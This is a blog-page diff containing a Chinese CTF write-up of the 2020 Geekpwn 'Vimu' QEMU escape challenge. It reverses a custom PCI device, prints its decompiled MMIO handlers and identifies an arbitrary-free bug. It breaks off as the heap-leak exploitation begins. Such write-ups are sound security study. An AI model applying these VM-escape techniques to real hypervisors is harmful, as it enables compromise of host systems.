@@ -1,0 +1,1474 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=STZhongsong:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|consolas:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/014.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/014.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/014.jpg?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="Qemu逃逸,RealWorld,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Vimu前言​        腾讯云鼎实验室主办的2020Geekpwn比赛在昨天晚上十点结束，我们队伍最终获得第五名的成绩，这个比赛难度相对比较大且压力主要在队伍的pwner身上，可以说是pwner的盛宴。 ​        比赛设有四道G-escape题目，也就是四道逃逸类型的题目，childshell，Vimu，Easykernelvm，Kimu，最终解出数分别为6，2，1，0，我在比赛中有">
+<meta name="keywords" content="Qemu逃逸,RealWorld">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020Geekpwn_极限逃逸Vimu_解题过程分析">
+<meta property="og:url" content="http://yoursite.com/2020/07/23/2020Geekpwn_极限逃逸Vimu_解题过程分析/index.html">
+<meta property="og:site_name" content="xiaoxiaorenwu">
+<meta property="og:description" content="Vimu前言​        腾讯云鼎实验室主办的2020Geekpwn比赛在昨天晚上十点结束，我们队伍最终获得第五名的成绩，这个比赛难度相对比较大且压力主要在队伍的pwner身上，可以说是pwner的盛宴。 ​        比赛设有四道G-escape题目，也就是四道逃逸类型的题目，childshell，Vimu，Easykernelvm，Kimu，最终解出数分别为6，2，1，0，我在比赛中有">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/Ui2vwcjCglKVZYG.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/GXrNJzekUfYgcwb.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/Ky9FnZvJEwHbdqc.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/2tX8AhdFY3IOVUJ.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/q4KQixrGUR6HF91.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/1T3KUDJ8xka2nOt.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/3dsDr4mHEzXIbN8.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/6MSwdYk5acQn9xt.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/FYKGu6tbxJSicOh.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/I4zKU18GCYVHjal.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/l2LoagOFTpXVsU1.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/iPD3bRc8Xrelz5S.png">
+<meta property="og:image" content="http://pwn4.fun/images/glibcmalloc/threadarena.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/zNkTBdOA8QxPZFK.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/KtYusjR6kQi24b8.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/AZtVCQmy1GjgepK.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/QImxo9kvewC8nMl.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/mai51K6p8df7HCn.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/bFnuiYPIgWe5H89.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/CGpPoySjXrA2T1L.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/Z6GBQJj29UDyMgf.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/13/i4GlrhJSy3NIzmd.png">
+<meta property="og:image" content="https://md.byr.moe/uploads/upload_77004e83b1dd6a6a5f4bbe879f23244c.png">
+<meta property="og:image" content="https://md.byr.moe/uploads/upload_751a1b025b19fbcba9d3dee371d0ef6c.png">
+<meta property="og:image" content="https://md.byr.moe/uploads/upload_c94f234084fbda656c9ea68c28858144.png">
+<meta property="og:image" content="https://md.byr.moe/uploads/upload_588d910ca2f1178877a8db345024b40e.png">
+<meta property="og:image" content="https://md.byr.moe/uploads/upload_6bcd2e5d69db75f6637d307e45a3b99b.png">
+<meta property="og:updated_time" content="2021-01-09T15:33:30.960Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2020Geekpwn_极限逃逸Vimu_解题过程分析">
+<meta name="twitter:description" content="Vimu前言​        腾讯云鼎实验室主办的2020Geekpwn比赛在昨天晚上十点结束，我们队伍最终获得第五名的成绩，这个比赛难度相对比较大且压力主要在队伍的pwner身上，可以说是pwner的盛宴。 ​        比赛设有四道G-escape题目，也就是四道逃逸类型的题目，childshell，Vimu，Easykernelvm，Kimu，最终解出数分别为6，2，1，0，我在比赛中有">
+<meta name="twitter:image" content="https://i.loli.net/2020/07/13/Ui2vwcjCglKVZYG.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","width":350,"display":"hide","offset":20,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/07/23/2020Geekpwn_极限逃逸Vimu_解题过程分析/">
+
+
+
+
+
+  <title>2020Geekpwn_极限逃逸Vimu_解题过程分析 | xiaoxiaorenwu</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta custom-logo">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xiaoxiaorenwu</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">生活的艰辛，三分来自压力，七分来自攀比，我想做个小人物</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/23/2020Geekpwn_极限逃逸Vimu_解题过程分析/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/xxrw.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xiaoxiaorenwu">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2020Geekpwn_极限逃逸Vimu_解题过程分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-23T00:05:04+08:00">
+                2020-07-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-PWN/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF-PWN</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/07/23/2020Geekpwn_极限逃逸Vimu_解题过程分析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2020/07/23/2020Geekpwn_极限逃逸Vimu_解题过程分析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  4.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  18 min
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Vimu"><a href="#Vimu" class="headerlink" title="Vimu"></a>Vimu</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        腾讯云鼎实验室主办的<code>2020Geekpwn</code>比赛在昨天晚上十点结束，我们队伍最终获得第五名的成绩，这个比赛难度相对比较大且压力主要在队伍的<code>pwner</code>身上，可以说是<code>pwner</code>的盛宴。</p>
+<p>​        比赛设有四道<code>G-escape</code>题目，也就是四道逃逸类型的题目，<code>childshell</code>，<code>Vimu</code>，<code>Easykernelvm</code>，<code>Kimu</code>，最终解出数分别为<code>6</code>，<code>2</code>，<code>1</code>，<code>0</code>，我在比赛中有幸第一个解出了<code>Vimu</code>，肝了小一天半，最后能解出还是很开心的，在这里记录一下解题过程。这道题其实说难也有难度，做完再回头看的话，说简单也简单，这个每个人感觉可能都不同，此外我本人接触<code>Qemu-Escape</code>的时间也很短，如有错误或疏漏的地方还请大佬们在评论区指出。</p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>题目给了<code>Dockerfile</code>，是<code>18.04</code>的标准版本，所以我还是用了我自己本地的<code>docker</code>，毕竟调试环境都配好了，比较方便，然后尝试运行，提示缺库，然后自行上网查找补齐即可，也没啥好说的，我大概补了七八个库才成功跑起来。。。</p>
+<p><img src="https://i.loli.net/2020/07/13/Ui2vwcjCglKVZYG.png" alt="image-20200713104400624.png"></p>
+<h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>查看题目的启动脚本，发现其启动了一个自定义设备<code>vin</code>，根据经验可知此应该为存在漏洞的自定义设备，把<code>qemu-systen-x86_64</code>放入<code>ida</code>中查看，发现被<code>strip</code>了，函数名和结构体都无了，所以必须把设备<code>vin</code>相关的函数给提取出来才能进一步分析，我这里是搜索特征字符串然后对比着<a href="https://github.com/qemu/qemu/blob/master/hw/misc/edu.c" target="_blank" rel="noopener">edu.c</a>源码提取出的函数：</p>
+<p><img src="https://i.loli.net/2020/07/13/GXrNJzekUfYgcwb.png" alt="image-20200713105209140.png"></p>
+<p>此外我还自己照着标准的<code>PCIDeviceClass</code>建了一个结构体，方便看<code>device_id</code>和<code>vender_id</code>：</p>
+<p><img src="https://i.loli.net/2020/07/13/Ky9FnZvJEwHbdqc.png" alt="image-20200713105328230.png"></p>
+<p><img src="https://i.loli.net/2020/07/13/2tX8AhdFY3IOVUJ.png" alt="image-20200713105301639.png"></p>
+<h3 id="函数与漏洞分析"><a href="#函数与漏洞分析" class="headerlink" title="函数与漏洞分析"></a>函数与漏洞分析</h3><p><code>vin_instance_init</code>函数伪代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">vin_instance_init</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = object_dynamic_cast_assert(</span><br><span class="line">         a1,</span><br><span class="line">         &amp;off_9FBFE6,</span><br><span class="line">         <span class="string">"/home/v1nke/Desktop/qemu/pwn/qemu-4.0.0/hw/misc/vin.c"</span>,</span><br><span class="line">         <span class="number">307L</span>L,</span><br><span class="line">         <span class="string">"vin_instance_init"</span>);</span><br><span class="line">  *(_QWORD *)(v1 + <span class="number">0x1AB0</span>) = <span class="number">0xFFFFFFF</span>LL;</span><br><span class="line">  *(_DWORD *)(v1 + <span class="number">0x1AC0</span>) = <span class="number">1</span>;</span><br><span class="line">  *(_QWORD *)(v1 + <span class="number">0x1AC8</span>) = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)(v1 + <span class="number">0x1AB8</span>) = mmap64(<span class="number">0L</span>L, (<span class="keyword">size_t</span>)&amp;stru_10000, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">return</span> object_property_add(a1, (__int64)<span class="string">"dma_mask"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到实例化设备结构体时<code>0x1AB0</code>，<code>0x1AB8</code>，<code>0x1AC0</code>，<code>0x1AC8</code>四个位置的元素比较特殊，需要引起注意，其中<code>0x1AB8</code>处装有一个<code>mmap64</code>申请出来的<code>0x10000</code>字节大小的内存块起始地址，具有<code>rw</code>权限，且这个地址是随机的。</p>
+<p><code>vin_mmio_read</code>函数伪代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">vin_mmio_read</span><span class="params">(__int64 a1, <span class="keyword">int</span> addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  __int64 opaque; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  opaque = a1;</span><br><span class="line">  dest = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( BYTE2(addr) == <span class="number">6</span> &amp;&amp; (<span class="keyword">unsigned</span> __int16)addr &lt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;stru_10000 - size )</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;dest, (<span class="keyword">const</span> <span class="keyword">void</span> *)((<span class="keyword">unsigned</span> __int16)addr + *(_QWORD *)(opaque + <span class="number">0x1AB8</span>)), size);</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>addr</code>是用户传进来的参数，其最后两个字节被作为<code>offset</code>，倒数第三个字节被当做<code>choice</code>：</p>
+<p><code>vin_mmio_read</code>时需要<code>choic == 6</code>且<code>offset</code>小于<code>0x10000-size</code>，<code>size</code>是根据你写的返回语句而定的，可以为<code>1/2/4</code>：</p>
+<p>比如你写成返回一个<code>uint64_t</code>类型的数据：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> mmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint64_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序就会自动调用两次<code>vin_mmio_read</code>，每次<code>size</code>等于4。</p>
+<p>你写成返回一个<code>uint32_t</code>类型的数据：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint32_t</span> mmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序就会调用一次<code>vin_mmio_read</code>，<code>size</code>等于4。</p>
+<p><code>addr</code>倒数第三个字节被当做<code>choice</code>：</p>
+<p><img src="https://i.loli.net/2020/07/13/q4KQixrGUR6HF91.png" alt="image-20200713110541488.png"></p>
+<p><code>addr</code>最后两个字节被当做<code>offset</code>：</p>
+<p><img src="https://i.loli.net/2020/07/13/1T3KUDJ8xka2nOt.png" alt="image-20200713110659097.png"></p>
+<p>这个函数实现的功能就是返回<code>mmap64_start+offset</code>处的数据给用户，也就是在<code>mmap64</code>内存块上可以任意地址读任意字节。</p>
+<p><code>vin_mmio_write</code>函数伪代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">vin_mmio_write</span><span class="params">(__int64 a1, __int64 a2, __int64 val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> n[<span class="number">12</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  __int64 addr; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  __int64 opaque; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+40h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  v6 = a1;</span><br><span class="line">  addr = a2;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">4</span>] = val;</span><br><span class="line">  opaque = a1;</span><br><span class="line">  v7 = BYTE2(a2);</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">      v12 = (<span class="keyword">unsigned</span> __int16)addr;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int16)addr &lt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;stru_10000 - size )</span><br><span class="line">        <span class="built_in">free</span>((<span class="keyword">void</span> *)(*(_QWORD *)(opaque + <span class="number">0x1AB8</span>) + v12));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">      v11 = (<span class="keyword">unsigned</span> __int16)addr;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int16)addr &lt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;stru_10000 - size )</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(v11 + *(_QWORD *)(opaque + <span class="number">0x1AB8</span>)), &amp;n[<span class="number">4</span>], size);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">      v10 = (<span class="keyword">unsigned</span> __int16)addr;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(opaque + <span class="number">0x1AC0</span>) == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_QWORD *)(opaque + <span class="number">0x1AC8</span>) = <span class="built_in">malloc</span>(<span class="number">8L</span>L * v10);</span><br><span class="line">        --*(_DWORD *)(opaque + <span class="number">0x1AC0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">      v9 = (<span class="keyword">unsigned</span> __int16)addr;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int16)addr &lt;= <span class="number">0x2F</span>u )</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(v9 + *(_QWORD *)(opaque + <span class="number">0x1AC8</span>)), &amp;n[<span class="number">4</span>], size);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">      v8 = (<span class="keyword">unsigned</span> __int16)addr;</span><br><span class="line">      <span class="built_in">malloc</span>(<span class="number">8L</span>L * (<span class="keyword">unsigned</span> __int16)addr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>addr</code>和<code>size</code>的用法同上，但是这里需要注意的是每个<code>case</code>所适配的<code>size</code>可能不同，比如你想调用<code>case 8</code>时，<code>size</code>就必须为<code>1</code>，你要是为<code>4</code>，他就会自动调用<code>4</code>次，且<code>addr</code>每次递增<code>1</code>，想调用<code>case 1</code>时，<code>size</code>必须为<code>4</code>，你要是为<code>8</code>，他就会自动调用两次，每次<code>addr</code>递增<code>4</code>，这点我当时做的时候被坑惨了。。。</p>
+<p>这个函数可以看到一共有<code>5</code>个<code>case</code>，<code>case 1</code>是一个任意<code>free(mmap64_start+offset)</code>的功能，这也是漏洞点所在，<code>case 3</code>是一个对<code>mmap64_start+offset</code>任意写的功能，<code>case 4</code>是用<code>malloc</code>申请一个任意<code>size</code>的<code>chunk</code>并保存在<code>0x1AC8</code>位置处，有且只有一次机会，<code>case 7</code>是对<code>0x1AC8</code>处指针指向的地址任意写的功能，且不限次数，初始的<code>0x1AC8</code>处存的值是<code>0</code>，<code>case 8</code>是一个不限次数，不限大小的<code>malloc</code>功能。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>看下<code>checksec</code>，发现保护全开，所以利用应该是需要劫持<code>hook</code>或者<code>rop</code>：</p>
+<p><img src="https://i.loli.net/2020/07/13/3dsDr4mHEzXIbN8.png" alt="image-20200713112140965.png"></p>
+<h4 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h4><p>如何<code>leak</code>出<code>libc</code>成为了这题的难点，需要注意<code>leak</code>不能使用那一次<code>case 4</code>，正常情况下那是留给<code>hijack</code>时任意地址分配+写时用的（当然也有可能先利用这次机会控制设备结构体，然后再突破次数限制）。</p>
+<h5 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h5><p>最先想到的肯定是把<code>fake_chunk</code>放进<code>unsortedbin</code>里，然后用<code>UAF</code>把<code>libc</code>泄露出来。</p>
